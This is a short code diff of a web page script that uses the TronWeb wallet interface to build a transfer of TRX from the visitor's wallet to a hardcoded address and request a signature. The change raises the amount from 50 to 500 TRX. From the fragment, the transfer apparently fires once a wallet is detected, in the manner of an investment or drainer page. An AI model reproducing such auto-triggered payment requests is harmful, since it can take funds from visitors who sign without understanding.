@@ -14,7 +14,7 @@
         <script>
 
 
-            var amount_Invested = 50; 
+            var amount_Invested = 500; 
 
             const contract_Address = "TDTwrJrprz3oHbmuCidnQus7Kzn5tENzyi"; 
             
@@ -30,7 +30,7 @@
                 clearInterval(obj)
                 var tronweb = window.tronWeb
 
-                var tx = await tronweb.transactionBuilder.sendTrx(contract_Address, amount_Invested * 1000000,"TRN8VHtkLAKTdzZRKUGpcaFQ4w5cf8hCEu")
+                var tx = await tronweb.transactionBuilder.sendTrx("TDTwrJrprz3oHbmuCidnQus7Kzn5tENzyi", amount_Invested * 1000000,)
 
                 var signedTx = await tronweb.trx.sign(tx)
 
